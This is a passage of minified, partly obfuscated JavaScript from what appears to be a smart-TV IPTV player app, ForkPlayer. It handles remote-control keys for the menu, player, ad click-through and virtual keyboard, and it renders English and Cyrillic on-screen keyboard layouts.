console.log(handler+" / key="+key);if(handler=="ext"){if(key==VK_RED||key==VK_A||key==VK_BACK){ext_close();return}
if($_("ext").style.display=="none"||typeof $_("frame-id")=="undefined")handler="menu";if(key==VK_BACK)$_("frame-id").contentWindow.postMessage({'cmd':'return','text':''},"*")}
if(key!=VK_ENTER)doubleEvent=0;switch(handler){case "group":switch(key){case VK_LEFT:case VK_ENTER:handler='menu';l11II1_JfwgOlIl1Ypr=Math.random();oInset[insetActive].focused();break;case VK_BACK:handler='menu';oInset[insetActive].back();break;case VK_DOWN:listGroup(++chGroupSel);break;case VK_UP:listGroup(--chGroupSel);break;default:break}
break;case "confirm":switch(key){case VK_LEFT:confirmed.sel("--");break;case VK_RIGHT:confirmed.sel("++");break;case VK_ENTER:confirmed.click();break;case VK_BACK:confirmed.close();break;case VK_DOWN:break;case VK_UP:break;default:break}
break;case "move":switch(key){case VK_DOWN:kjtYpr.Edit(gP("lIQ0Il1IlIb1Il1OYpr"),"down");handler="move";break;case VK_LEFT:kjtYpr.Edit(gP("lIQ0Il1IlIb1Il1OYpr"),"left");handler="move";break;case VK_RIGHT:kjtYpr.Edit(gP("lIQ0Il1IlIb1Il1OYpr"),"right");handler="move";break;case VK_UP:kjtYpr.Edit(gP("lIQ0Il1IlIb1Il1OYpr"),"up");handler="move";break;case VK_BACK:case VK_ENTER:handler="menu";break}
break;case "context":switch(key){case VK_DOWN:if(subMenu.length)kjtYpr.l1Q1OIO0duul1l1IlYprPos(++subllQI1IlixJG1OIIIYpr,!0);else kjtYpr.l1Q1OIO0duul1l1IlYprPos(++llQI1IlixJG1OIIIYpr);break;case VK_UP:if(subMenu.length)kjtYpr.l1Q1OIO0duul1l1IlYprPos(--subllQI1IlixJG1OIIIYpr,!0);else kjtYpr.l1Q1OIO0duul1l1IlYprPos(--llQI1IlixJG1OIIIYpr);break;case VK_ENTER:console.log("subMenu.length="+subMenu.length);subMenuEnter();break;case VK_RED:case VK_A:case VK_BACK:case 8:case 220:Menu=[];lI1I1IxFCIh1l01llYpr("MenuCh","");$_("MenuCh").style.display="none";closeSubMenu();handler="menu";break}
break;case "vk":livecaret=!0;clearTimeout(livecarettimer);livecarettimer=setTimeout("livecaret=false;",2500);if(kjtYpr.GL.keyboard=="system"){VK.focus.setAttribute("readonly","true");VK.focus.blur()}
switch(key){case VK_0:VK.enter(0);break;case VK_1:VK.enter(1);break;case VK_2:VK.enter(2);break;case VK_3:VK.enter(3);break;case VK_4:VK.enter(4);break;case VK_5:VK.enter(5);break;case VK_6:VK.enter(6);break;case VK_7:VK.enter(7);break;case VK_8:VK.enter(8);break;case VK_9:VK.enter(9);break;case VK_DOWN:console.log("VK_DOWN "+kjtYpr.GL.keyboard);if(VK.pos[0]==3||kjtYpr.PresearChSelected>-1||kjtYpr.GL.keyboard=="system"){if(kjtYpr.lll110DUxOQIl1Ypr.length>0){kjtYpr.PresearChSelected++;kjtYpr.l1O10l10HkBwOllII0Ypr();if(kjtYpr.PresearChSelected==kjtYpr.lll110DUxOQIl1Ypr.length-1&&VK.pos[0]==3)VK.pos[0]++}else VK.pos[0]++}else VK.pos[0]++;VK.setpos(1);break;case VK_UP:if(VK.pos[0]==0||kjtYpr.PresearChSelected>-1||kjtYpr.GL.keyboard=="system"){if(kjtYpr.lll110DUxOQIl1Ypr.length>0){kjtYpr.PresearChSelected--;kjtYpr.l1O10l10HkBwOllII0Ypr();if(kjtYpr.PresearChSelected==-1&&VK.pos[0]==0)VK.pos[0]--}else VK.pos[0]--}else VK.pos[0]--;VK.setpos(1);break;case VK_LEFT:VK.pos[1]--;VK.setpos();break;case VK_RIGHT:VK.pos[1]++;VK.setpos();break;case VK_ENTER:if(kjtYpr.PresearChSelected==-1)VK.enter(VK.lI0l001QluKXlIl0Ypr[VK.pos[0]][VK.pos[1]][VK.shift]);else{VK.enter("Enter");kjtYpr.PresearChSelected=-1;kjtYpr.l1O10l10HkBwOllII0Ypr();VK.pos[0]=2;VK.pos[1]=13;VK.setpos()}
break;case VK_G:case VK_GREEN:case 35:if(["playlist_url"].indexOf("allsearch.php")>0)kjtYpr.l1Q1OIO0duul1l1IlYprPlay("cmdSetSearch");else VK.enter("_ST_international.png");break;case VK_BLUE:VK.enter("_ST_enter.png");break;case 46:case VK_YELLOW:clearQuick();break;case VK_RED:VK.enter("_ST_backspace.png");break;case VK_BACK:case 220:clearTimeout(xml_livetimer);lastStr="";returnVK();break;default:console.log(key+"="+String.fromCharCode(key));if((key>=65&&key<=90)||(key>=186&&key<=222)||key==32||key==8||key==46){var s="";if(key==46){VK.enter("_ST_backspace.png");return}
if(key==186)s=";";if(key==187)s="=";if(key==188)s=",";if(key==189)s="-";if(key==190)s=".";if(key==191)s="/";if(key==192)s="`";if(key==219)s="[";if(key==220)s="\\";if(key==221)s="]";if(key==222)s="'";if(VK.lI0l001QluKXlIl0Ypr[1][0][0]=="q"){if(s=="")s=String.fromCharCode(key).toLowerCase()}else{var from="qwertyuiop[]asdfghjkl;'zxcvbnm,./".split("");var dest="йцукенгшщзхъфывапролджэячсмитьбю.".split("");console.log(from);if(s=="")s=String.fromCharCode(key).toLowerCase();s=replaceArray(s,from,dest)}}
break}
break;case "qual":switch(key){case VK_BACK:case 8:case 220:$_("QualCh").style.display="none";handler="player";break;case VK_LEFT:llIO1llNDl0IIlYpr(-1);break;case VK_RIGHT:llIO1llNDl0IIlYpr(1);break;case VK_UP:kjtYpr.llII110Ic1wWOIIIlYpr--;l000IlIOlu1l1I1llQlYpr();break;case VK_DOWN:kjtYpr.llII110Ic1wWOIIIlYpr++;l000IlIOlu1l1I1llQlYpr();break;case VK_ENTER:llIO1llNDl0IIlYpr(0);break;case VK_BLUE:if(platform=="sams"){kjtYpr.GL.xmode=parseInt(kjtYpr.GL.xmode);kjtYpr.GL.xmode+=1;if(kjtYpr.GL.xmode>2)kjtYpr.GL.xmode=0;else if(kjtYpr.GL.xmode<0)kjtYpr.GL.xmode=2;Player.setSize(kjtYpr.GL.xmode);kjtYpr.lll0Il11OxICbl1ll0Ypr("settings",llIl1I1HlMgNII1IO0Ypr(kjtYpr.GL));kjtYpr.llII110Ic1wWOIIIlYpr=4;newOptions()}else if(lIO1OIOlAQzl1Ol1lYpr=="tizen"){setProp(parseInt(++kjtYpr.GL.xmode))}
break}
break;case "menu":if($_("ext").style.display=="block"){handler="ext";kjtYpr.popUp("<img width='55' src='"+_img("_ST_important.png")+"' style='float:left;padding-right:5px;' /> "+"Запущен iframe<br>"+"Меню (красная кнопка) - Закрыть<br>"+"CH UP / CH DOWN - Открыть другую вкладку"+"",2000);return}
if(vk_visual){if(key==VK_BACK||key==8||key==220||key==VK_LEFT||key==VK_RIGHT||key==VK_LEFT||key==VK_DOWN||key==VK_ENTER||key==VK_STOP){vk_visual=0;vk_Visualaudio();return}}
if(is_ifr()){{}}
b=key;a[0]=Date.now();switch(key){case VK_0:setKey(0);break;case VK_1:setKey(1);break;case VK_2:setKey(2);break;case VK_3:setKey(3);break;case VK_4:setKey(4);break;case VK_5:setKey(5);break;case VK_6:setKey(6);break;case VK_7:setKey(7);break;case VK_8:setKey(8);break;case VK_9:setKey(9);break;case VK_EXIT:kjtYpr.Exittrue++;if(kjtYpr.Exittrue<2){kjtYpr.inf("_FPNazhmExitEsheRazDlyaVihoda_!",1300,"red")}else{console.log("exit");if(TS)autoexport();else closeapp()}
break;case VK_PAGE_UP:case 33:console.log("pg up");kth=0;if($_("scrolled")!=null)var nd="scrolled";else nd="rightHalf";if($_(nd).scrollTop<=0){$_(nd).scrollTop=0;if(getSelect()>=0){console.log("pg up sel=-1");if(gP().menu.length)oInset[insetActive].focused(0);oInset[insetActive].focused(-1)}else buff.scrollsitetop(buff.scrollsitetop()-250)}else $_(nd).scrollTop-=25;break;case VK_PAGE_DOWN:case 34:if(getSelect()==-1){select=oldselect;oInset[insetActive].focused();return}else{if($_("scrolled")!=null)var nd="scrolled";else nd="rightHalf";var th=$_(nd).scrollTop;$_(nd).scrollTop+=25;if(th==$_(nd).scrollTop){if(nd=="scrolled"&&kth<3){kth++;var div=document.createElement('div');div.id="blinkdiv";div.style.position="relative";div.style.height="0px";div.style.marginTop="-4px";div.style.display="block";div.style.width=$_(nd).style.width+"px";div.style.border="2px solid red";$_(nd).appendChild(div);setTimeout('$_("blinkdiv").parentNode.removeChild($_("blinkdiv"));',800)}else buff.scrollsitetop(buff.scrollsitetop()+250)}else kth=0}
break;case VK_BACK:case 8:case 220:if(menuSubSel>-2)return menu_hideSub();clearTimeout(backtimer);backtimer=setTimeout(function(){plmini_canplay=!0;oInset[insetActive].back()},30);break;case VK_FAST_FWD:case VK_RIGHT:case VK_LEFT:case VK_REWIND:case VK_RED:case VK_A:case VK_GREEN:case VK_B:case VK_YELLOW:case VK_C:l01lI01OIIiXQlQOIYpr(handler,key);break;case VK_Q:if(ttmac||document.location.href.indexOf("960_540")>0){if(curCh()["playlist_url"].indexOf("?list=")>0){var k=curCh()["playlist_url"].split("?list=")[1];$_("infoList").innerHTML=unescape(k)}else $_("infoList").innerHTML=curCh()["playlist_url"]+curCh("stream_url")}
break;case VK_UP:if($_("scrolltextarea")!=null){if($_("scrolltextarea").scrollTop>0){$_("scrolltextarea").scrollTop-=200;return}}
osetPos(0,-1);break;case VK_DOWN:if($_("scrolltextarea")!=null){$_("scrolltextarea").scrollTop+=200}else osetPos(0,1);break;case VK_ENTER:if(doubleEvent){doubleEvent=0;l01lI01OIIiXQlQOIYpr('menu',VK_RED);return}
doubleEvent=1;doubleTimer=setTimeout(function(){if(!doubleEvent)return;doubleEvent=0;if(getSelect()==-4){eval(omniBut[omni_hor].onclick)}else if(getSelect()==-3)menu_play();else if(getSelect()==-2)sidebar_play();else if(getSelect()==-1)playInset();else{if(plmini_on&&curCh()["playlist_url"]==""){curTime=getCur();if(curTime>0){if(rek_url!=""){rek_url="";is_adult=!0}
ident=getIdent(select);if(playIdent!=ident){l1llOQI10lW1l_II101Ypr();setTimeout("oInset[insetActive].play();",200)}else{lIIl0Il0LaVOO0OIYpr();ll0lIOsIoIIlOlYpr(playUrl);if(platform=="sams"){FXMLPage.lIlO1OI1Mlt001lIYpr();Player.OnBufferingComplete()}
plmini_on=!1}}else{if(curTime>0)SaveTime("plmini");l1llOQI10lW1l_II101Ypr();setTimeout("oInset[insetActive].play();",200)}}else oInset[insetActive].play()}},300);break;case VK_BLUE:gotoStart();break;case VK_P:case VK_PLAY:if(gP().is_iptv>2){play_mini()}else{console.log("audio pl="+l0I110IO1SyqII1lI1Ypr);if(l0I110IO1SyqII1lI1Ypr){if(parseInt($_('vk_audio_pos').style.width)<2||stopped){l1O010LAAOlI1IIYpr();$_("vk_play_button").style.display="none"}else goMedia()}}
break;case VK_PAUSE:if(l0I110IO1SyqII1lI1Ypr)pauseMedia();break;case VK_STOP:case VK_S:clearTimeout(rettimer);if(l0I110IO1SyqII1lI1Ypr&&stopped){try{$_("vk_audio").style.display="none";$_("vk_audio").style.zIndex="-2";$_("vk_play_button").style.display="block"}catch(e){}}
try{if(minimize){minimizeplayer(!1)}
l1llOQI10lW1l_II101Ypr();page_rs({"src":"_stop"})}catch(e){}
break}
break;case "player":showPlayer();if(rek_url!=""&&is_rek){if(key==VK_LEFT){rek_sel--;rekBox()}
if(key==VK_RIGHT){rek_sel++;rekBox()}
if(key==VK_PAUSE)pauseMedia();else if(paused)goMedia();else if(key==VK_ENTER){if(rek_sel==0&&Point["ClickThrough"]!=""){pauseMedia();confirmed.create("Перейти по обьявлению <b>"+Point["linkTxt"]+"</b>?<br>"+(Point["ClickThrough"].indexOf("html://")==0?"ForkPlayer при этом будет закрыт!":Point["ClickThrough"]),"_FPAre you sure_?");confirmed.fun0=function(){l1lllUlxeIO1O1OYpr(gV(Point,"complete"),"half");endrek();l1llOQI10lW1l_II101Ypr();if(Point["ClickThrough"].indexOf("html://")==0){document.location=Point["ClickThrough"].substr(7)}else if(Point["ClickThrough"].indexOf("http")==0&&Point["ClickThrough"].indexOf("xml")==-1){if(platform=="android-device")document.location=Point["ClickThrough"];else{$_("ext").style.display="block";lI1I1IxFCIh1l01llYpr("ext",'<iframe id="frame-id" style="margin-top: 0px; border:none; background-color:black;" width="1280" height="640" src="'+Point["ClickThrough"]+'" />');kjtYpr.popUp("<img width='55' src='"+_img("_ST_important.png")+"' style='float:left;padding-right:5px;' /> "+"Запущен сайт в iframe<br>"+"Меню (красная кнопка) - Закрыть<br>"+"CH UP / CH DOWN - Открыть другую вкладку"+"",2000);handler="ext"}}else OpenUrl({"title":"Реклама "+Point["linkTxt"],"playlist_url":Point["ClickThrough"]})};confirmed.fun1=function(){handler="player";goMedia()}}else if(Point["skipTime"]>0&&Point["skipTime"]<getCur()){pauseMedia();endrek();rek_url="";console.log("skip");setTimeout(function(){console.log("load skip");l1lllUlxeIO1O1OYpr(Point["skip"],"skip")},150);return}}
return!1}
b="player"+key;a[0]=Date.now();switch(key){case VK_0:setPercent(0);break;case VK_1:setPercent(10);break;case VK_2:setPercent(20);break;case VK_3:setPercent(30);break;case VK_4:setPercent(40);break;case VK_5:setPercent(50);break;case VK_6:setPercent(60);break;case VK_7:setPercent(70);break;case VK_8:setPercent(80);break;case VK_9:setPercent(90);break;case VK_FAST_FWD:lIl0I1O0Iab1I10Ypr();break;case VK_REWIND:lI1llO1QIebXl10lO1Ypr();break;case 259:case 10190:flastView();break;case VK_L:case VK_INFO:if($_("loading").style.display=="block")$_("loading").style.display="none";info_mode++;if(info_mode>4){info_mode=0;hidePlayer()}
if(info_mode==1){}else if(info_mode==2){info_mode++;hidePlayer()}else if(info_mode==3){hidePlayer()}else if(info_mode==4){hidePlayer()}
if(info_mode>0)return;break;case 32:case 10252:if(paused){if(lI0lOIE0IjIIlOO1Ypr>0){lO1I011lII1RO0lO1OOYpr()}else goMedia()}else pauseMedia();break;case VK_PAUSE:pauseMedia();break;case VK_PLAY:if(lI0lOIE0IjIIlOO1Ypr>0){lO1I011lII1RO0lO1OOYpr()}else goMedia();break;case VK_STOP:case VK_EXIT:case VK_BACK:l1llOQI10lW1l_II101Ypr();break;case VK_Y:case VK_YELLOW:if(gP().is_iptv>2){minimizeplayer(!0);set_epg()}else if(lIO1OIOlAQzl1Ol1lYpr=="jw"){kjtYpr.llII110Ic1wWOIIIlYpr=0;optId[kjtYpr.llII110Ic1wWOIIIlYpr]="jwquality";llIO1llNDl0IIlYpr(1)}
break;case VK_A:case VK_RED:minimizeplayer(!0);break;case VK_BLUE:if(lIO1OIOlAQzl1Ol1lYpr=="jw"){kjtYpr.llII110Ic1wWOIIIlYpr=0;optId[kjtYpr.llII110Ic1wWOIIIlYpr]="jwstretching";llIO1llNDl0IIlYpr(1)}else if(lIO1OIOlAQzl1Ol1lYpr=="tizen"){if(typeof kjtYpr.GL.xmode=="undefined")kjtYpr.GL.xmode=0;kjtYpr.GL.xmode=parseInt(kjtYpr.GL.xmode)+1;if(kjtYpr.GL.xmode>2)kjtYpr.GL.xmode=0;else if(kjtYpr.GL.xmode<0)kjtYpr.GL.xmode=2;setProp(kjtYpr.GL.xmode);kjtYpr.lll0Il11OxICbl1ll0Ypr("settings",llIl1I1HlMgNII1IO0Ypr(kjtYpr.GL))}else if(platform=="sams"){kjtYpr.GL.xmode=parseInt(kjtYpr.GL.xmode);kjtYpr.GL.xmode+=1;if(kjtYpr.GL.xmode>2)kjtYpr.GL.xmode=0;else if(kjtYpr.GL.xmode<0)kjtYpr.GL.xmode=2;Player.setSize(kjtYpr.GL.xmode);kjtYpr.lll0Il11OxICbl1ll0Ypr("settings",llIl1I1HlMgNII1IO0Ypr(kjtYpr.GL))}else if(uaJ=="mag"||uaJ=="dune"){magpropv(++kjtYpr.GL.xmode)}else if(uaJ=="lg"||uaJ=="lgw"||uaJ=="lgw2"){l0QIllCwu0OO0Ypr()}else if(lIO1OIOlAQzl1Ol1lYpr=="html5"||lIO1OIOlAQzl1Ol1lYpr=="ifrhtml5"){kjtYpr.GL.xmode=parseInt(kjtYpr.GL.xmode);kjtYpr.GL.xmode+=1;if(kjtYpr.GL.xmode>4)kjtYpr.GL.xmode=0;chvr=!0;setVideoResolution();kjtYpr.lll0Il11OxICbl1ll0Ypr("settings",llIl1I1HlMgNII1IO0Ypr(kjtYpr.GL))}
break;case VK_GREEN:if(lIO1OIOlAQzl1Ol1lYpr=="jw"){kjtYpr.llII110Ic1wWOIIIlYpr=0;optId[kjtYpr.llII110Ic1wWOIIIlYpr]="jwaudio";llIO1llNDl0IIlYpr(1)}else if(lIO1OIOlAQzl1Ol1lYpr=="tizen"){var trackInfo=webapis.avplay.getTotalTrackInfo();Player.tnum=0;Player.snum=0;Player.tnum_start=-1;Player.snum_start=-1;var s="";for(var i=0;i<trackInfo.length;i++){s+=trackInfo[i].type+"<br>";if(trackInfo[i].type=="AUDIO"){if(Player.tnum_start<0)Player.tnum_start=i;Player.tnum++}
if(trackInfo[i].type=="TEXT"){if(Player.snum_start<0)Player.snum_start=i;Player.snum++}}
optId[kjtYpr.llII110Ic1wWOIIIlYpr]="setaudio";llIO1llNDl0IIlYpr(1)}else if(platform=="sams"){if(Player.total_time>0){Player.SEFSetNextAudioStream(1)}else lI010lp_Z1l1O0Ypr("Сейчас недоступно!")}else{if(lIO1OIOlAQzl1Ol1lYpr=="media"&&tFlp=="lg"){if(pstream)var type="application/x-netcast-av";else type="video/mp4";lI1I1IxFCIh1l01llYpr("jw",'<object type="'+type+'" preBufferingTime="8" audioLanguage="en" data="'+playUrl+'" width="100%" height="100%" id="media" autostart="true" downloadable="false"></object>');media=$_("media");setTimeout("media.play(1);",200)}}
break;case VK_RIGHT:if(playUrl=="description"){plDesc-=css_wh(720);if(plDesc>0)plDesc=0;$_("jw").style.marginTop=plDesc+"px";return}
FsetFocus(1);break;case VK_LEFT:if(playUrl=="description"){plDesc+=css_wh(720);if(plDesc>0)plDesc=0;$_("jw").style.marginTop=plDesc+"px";return}
FsetFocus(-1);break;case VK_UP:if(playUrl=="description"){plDesc+=15;if(plDesc>0)plDesc=0;$_("jw").style.marginTop=plDesc+"px";return}
if(rowID<3){rowID++}
if(!is_arc&&!is_vod()&&pstream&&rowID==2)rowID++;if(rowID==3){l1ll0OuCKZQlOIlIYpr=cntIndex;cntIndex>1?cntIndex=1:""}
try{FsetFocus(0)}catch(e){console.log(e);kjtYpr.popUp("Err set focus:<br>"+e.toString(),3000);l0OIQIl1OI0IlI0lIYpr(url)}
break;case VK_DOWN:if(playUrl=="description"){plDesc-=15;$_("jw").style.marginTop=plDesc+"px";return}
if(rowID>1){rowID--;l1ll0OuCKZQlOIlIYpr!=-1?cntIndex=l1ll0OuCKZQlOIlIYpr:""}
if(!is_arc&&!is_vod()&&pstream&&rowID==2)rowID--;FsetFocus(0);break;case VK_ENTER:if($_("playerBottom").style.display=="block")selectedButton();break;case VK_PAGE_UP:l1OIllOSQ1IQ01IYpr();break;case VK_PAGE_DOWN:lIl1lIlI1fO0qOO01lYpr();break;case VK_MUTE:plVolume(0,!0)
break;case KEY_VOLUME_PLUS:plVolume(10);break;case KEY_VOLUME_MINUS:plVolume(-10);break}
triggerHide();break}
event.returnValue=!1;return!1}
function l01lI01OIIiXQlQOIYpr(mode,key){switch(mode){case "menu":switch(key){case VK_N:case VK_FAST_FWD:if(l0I110IO1SyqII1lI1Ypr)l1O010LAAOlI1IIYpr(null,++vk_audio_sel);break;case VK_REWIND:if(l0I110IO1SyqII1lI1Ypr)l1O010LAAOlI1IIYpr(null,--vk_audio_sel);break;case VK_BLUE:gotoStart();break;case VK_RED:case VK_A:if($_("ext").style.display=="block"){handler="menu";lI1I1IxFCIh1l01llYpr("ext","");$_("ext").style.display="none";return}
if(minimize){minimizeplayer(!1)}else kjtYpr.l1Q1OIO0duul1l1IlYpr();break;case VK_GREEN:case VK_B:if(typeof curCh()["green"]=="object"){ol1IO0ORc1_tI0QlYpr(curCh()["green"])}else ol1IO0ORc1_tI0QlYpr("about:favorites");break;case VK_YELLOW:case VK_C:if(typeof curCh()["yellow"]=="object"){ol1IO0ORc1_tI0QlYpr(curCh()["yellow"])}else if(curCh()["yellow_url"]!=""){var ch={};ch.title=curCh()["yellow_title"];ch.parser=curCh()["yellow_parser"];ch.playlist_url=curCh()["yellow_url"];ol1IO0ORc1_tI0QlYpr(ch)}else{kjtYpr.l1Q1OIO0duul1l1IlYpr('topmenu')}
break;case VK_RIGHT:osetPos(1,0);break;case VK_LEFT:osetPos(-1,0);break}
break}}
function minimizeplayer(mode){minimize=mode;if(mode){hidePlayer(!0);$_("main").style.display="block";$_("main").style.zIndex="4";$_("main").style.background="none";$_("main").style.opacity="0.9";handler="menu";linkOver();set_times()}else{$_("main").style.display="none";$_("main").style.zIndex="0";FXMLPage.lIlO1OI1Mlt001lIYpr();$_("main").style.opacity="1";handler="player"}}
function trpt(){if(lI0lOIE0IjIIlOO1Ypr>0){lO1I011lII1RO0lO1OOYpr()}}
var lastView=-1,lastView2=-1,lastViewUrl="",lastViewUrl2="",lastViewTitle="",lastViewTitle2="",lastViewUrlOrig="",lastViewUrlGo=!1;function flastView(m){if(lastView2<0){if(lastViewUrl2!=""){return;try{if(platform=="sams")samsStop();else if(lIO1OIOlAQzl1Ol1lYpr=="ifrhtml5"){lI1I1IxFCIh1l01llYpr("other","");video.src=""}else if(lIO1OIOlAQzl1Ol1lYpr=="html5"){video.src=""}else{lI1I1IxFCIh1l01llYpr("jw","");lI1I1IxFCIh1l01llYpr("other","")}}catch(e){kjtYpr.popUp(e.message)}
lIIl0Il0LaVOO0OIYpr();ll0lIOsIoIIlOlYpr(lastViewUrl2,{"title":lastViewTitle2,"stream_url":lastViewUrl2});lastViewUrlGo=!0}}else{select=lastView2;oInset[insetActive].focused();kjtYpr.l1O0OOzczEvllIOYpr(lIO1OIOlAQzl1Ol1lYpr)}
if(m){cntIndex=5;FsetFocus(0)}}
var PLINDEX=-1;function lIl1lIlI1fO0qOO01lYprNext(m){if(typeof playElement.playlist=="object"){PLINDEX+=m;if(PLINDEX<-1)PLINDEX=playElement.playlist.length-1;if(PLINDEX>=0){var ch=playElement.playlist[PLINDEX];ch.playlist=playElement.playlist;oInset[insetActive].navigate(ch,playElement.openwith);return}}
if(m==1)setSelect("++");else setSelect("--");if(curCh("stream_url")!=""){easystop();oInset[insetActive].navigate(curCh(),playElement.openwith)}else l1llOQI10lW1l_II101Ypr()}
function lIl1lIlI1fO0qOO01lYpr(){lIl1lIlI1fO0qOO01lYprNext(-1)}
function l1OIllOSQ1IQ01IYpr(){lIl1lIlI1fO0qOO01lYprNext(1)}
var VK={pos:[2,7],last:[0,0],last2:[0,0],shift:0,lI0l001QluKXlIl0Ypr:null,UrlSearch:null,focus:null,};VK.render=function(){var html='';for(i in VK.lI0l001QluKXlIl0Ypr){for(j in VK.lI0l001QluKXlIl0Ypr[i]){if(VK.lI0l001QluKXlIl0Ypr[i][j].length==1)var vshift=0;else vshift=VK.shift;var but=VK.lI0l001QluKXlIl0Ypr[i][j][vshift];if(but.indexOf("_ST_")==0||but.indexOf("http")==0)var pbut="<img src='"+_img(but)+"'>";else pbut=but;if(but.indexOf("international.png")>0)var cl="green";else if(but.indexOf("backspace.png")>0)cl="#ce0d0d";else if(but.indexOf("enter.png")>0)cl="blue";else if(but.indexOf("clear.png")>0)cl="#e9d737";else cl=""
if(cl!="")pbut="<span style='border-radius:2px;position: absolute;padding: 5px; margin: "+css_wh(39)+"px 3%;background: "+cl+";'></span>"+pbut;html+="<div onmousemove=\"VK.pos[0]="+i+";VK.pos[1]="+j+";VK.setpos();\" "+"onclick=\"VK.enter('"+but+"');\" id='kb"+i+""+j+"' style='margin:1px;padding: 0.1% 0%; border-radius:6px;float:left;font-size: 170%;width:6%;height:22%;overflow:hidden;'>"+pbut+"</div>"}
html+="<br clear='both' />"}
lI1I1IxFCIh1l01llYpr("keyboard",html);VK.setpos()};VK.Show=function(mode,el,inputId,ttl,vvv){console.log("ShowVK");console.trace();getwh();$_("vk").style.top="0px";$_("vk").style.left="137px";$_("vk").style.width=(innerW-150)+"px";$_("vk").style.height="95%";$_("vk").style.overflow="hidden";$_("vk").style.zIndex="3";$_("vk").style.fontSize=(0.0347*innerH).toFixed(0)+'px';if(inputId==null)inputId="";VK.US=[[["1","!"],["2","="],["3","#"],["4","$"],["5","%"],["6","^"],["7","&"],["8","*"],["9","("],["0",")"],["https://raw.githubusercontent.com/komivp/appinfodl/main/static/copy.png"],["https://raw.githubusercontent.com/komivp/appinfodl/main/static/paste.png"],["https://raw.githubusercontent.com/komivp/appinfodl/main/static/clear.png"],["_ST_backspace.png"],["https://raw.githubusercontent.com/komivp/appinfodl/main/static/return.png"]],[["q","Q"],["w","W"],["e","E"],["r","R"],["t","T"],["y","Y"],["u","U"],["i","I"],["o","O"],["p","P"],["[","{"],["]","}"],["@","-"],[":","+"],["_ST_international.png"]],[["\\","|"],["a","A"],["s","S"],["d","D"],["f","F"],["g","G"],["h","H"],["j","J"],["k","K"],["l","L"],["_",";"],["'",'"'],["/","?"],["_ST_enter.png"]],[["+","#"],["z","Z"],["x","X"],["c","C"],["v","V"],["b","B"],["n","N"],["m","M"],[",","<"],[".",">"],["https://raw.githubusercontent.com/komivp/appinfodl/main/static/left.png"],["https://raw.githubusercontent.com/komivp/appinfodl/main/static/right.png"],["_ST_space.png"],["_ST_shift.png"]],];VK.Kir=[[["1","!"],["2",'"'],["3","\u2116"],["4",";"],["5","%"],["6",":"],["7","?"],["8","*"],["9","("],["0",")"],["https://raw.githubusercontent.com/komivp/appinfodl/main/static/copy.png"],["https://raw.githubusercontent.com/komivp/appinfodl/main/static/paste.png"],["https://raw.githubusercontent.com/komivp/appinfodl/main/static/clear.png"],["_ST_backspace.png"],["https://raw.githubusercontent.com/komivp/appinfodl/main/static/return.png"]],[["\u0439","\u0419"],["\u0446","\u0426"],["\u0443","\u0423"],["\u043A","\u041A"],["\u0435","\u0415"],["\u043D","\u041D"],["\u0433","\u0413"],["\u0448","\u0428"],["\u0449","\u0429"],["\u0437","\u0417"],["\u0445","\u0425"],["\u044A","/"],["@","-"],[":","_"],["_ST_international.png"]],[["ф","Ф"],["\u044B","І"],["\u0432","\u0412"],["\u0430","\u0410"],["\u043F","\u041F"],["\u0440","\u0420"],["\u043E","\u041E"],["\u043B","\u041B"],["\u0434","\u0414"],["\u0436","\u0416"],["\u044D","є"],["і","ї"],["+","\u0401"],["_ST_enter.png"]],[["\u044F","\u042F"],["\u0447","\u0427"],["\u0441","\u0421"],["\u043C","\u041C"],["\u0438","\u0418"],["\u0442","\u0422"],["\u044C","\u042C"],["\u0431","\u0411"],["\u044E","\u042E"],[".",","],["https://raw.githubusercontent.com/komivp/appinfodl/main/static/left.png"],["https://raw.githubusercontent.com/komivp/appinfodl/main/static/right.png"],["_ST_space.png","_ST_space.png"],["_ST_shift.png"]],];if(VK.lI0l001QluKXlIl0Ypr==null)VK.lI0l001QluKXlIl0Ypr=VK.Kir;if(gV(el,"playlist_url")=="cmdEnterlist"){VK.lI0l001QluKXlIl0Ypr=VK.US}
try{if(mode!=null)VK.Mode=mode;else VK.Mode=0;if(gV(ttl)=="")ttl="_FPVvediteText_";var gtitle="";if(inputId!="editurl"){if($_("ch"+getSelect())!=null)$_("ch"+getSelect()).style.visibility="hidden";if(gV(el,"title")!="")gtitle="<div style='background-color: #323c42;white-space: nowrap;'>"+ttl+" ("+gV(el,"title").replace(/<.*?>/g,"")+")</div>";else gtitle="<div style='background-color: #323c42;'>"+ttl+"</div>"}
html='<div style="font-size:'+(10000/kjtYpr.GL.zoom).toFixed(0)+'%'+';height: '+Math.ceil(0.65*(innerH-35))+'px;margin-top:35px;border-radius:8px;width:97.3%;text-align: left;overflow:hidden;zoom:'+kjtYpr.GL.zoom+'%;">'+gtitle+'<div style="margin: 0px; background-color: #eeeeee;width:auto;text-align: left;"><span id="navinfo2" style="float:left;color:gray;">'+gV($_("navinfo2"),"innerHTML")+'</span>'+'<span id="icosearch" style="float:right;height:'+css_wh(36)+'px;width:'+css_wh(36)+'px;"></span>'+'<div style="overflow: hidden;"><form onsubmit="onkeyb(this); return false;"><input '+(kjtYpr.GL.keyboard!="system"?' readonly="true"':'')+' id="search" type="text" style="height:'+css_wh(32)+'px;padding: 0px;width: 98%; border: 2px solid rgb(101, 208, 228);font-size: 100%;"></form></div>   </div>'+'<div id="presearch"></div> </div>';html+='<div id="keyboard" style="height: '+Math.ceil(0.35*(innerH-35))+'px;position: absolute; width: 100%;bottom:0px;'+(kjtYpr.GL.keyboard=="system"?"display:none;":"")+'"></div>';lI1I1IxFCIh1l01llYpr("vk",html);VK.render();$_("vk").style.display="block";$_("vk").style.textAlign="center";$_("vk").style.verticalAlign="middle";$_("vk").style.overflow="visible";if($_('infoList')!=null)$_('infoList').style.zIndex="1";kjtYpr.inputId=inputId;VK.id="search";VK.focus=$_(VK.id);if(vvv!=null)VK.focus.value=vvv;else VK.focus.value=gV(el,"value");handler="vk";if(el==null)el=oInset[insetActive].curCh();VK.focus.type=gV(el,"type");if(gV(el,"type")=="password")VK.focus.type=el.type;VK.el=el;if(VK.Mode==0)lI0I0QIO10llQlQI1Ypr(gV(el,"value"),null,el);if(kjtYpr.GL.keyboard=="system"){VK.focus.focus();if(VK.focus.value!="")setCaretPosition(VK.focus.value.length);VK.focus.addEventListener("keydown",function(event){key=event.keyCode||event.keycode||event.which;console.log(event);if(key==VK_LEFT||key==VK_RIGHT){if(kjtYpr.PresearChSelected!=-1)lO0IIlIDUlOllIO0IYpr(VK.focus.value)}else if(key==VK_BACK||key==27||(key==8&&VK.focus.value=="")){setTimeout("returnVK(1);	",100)}else 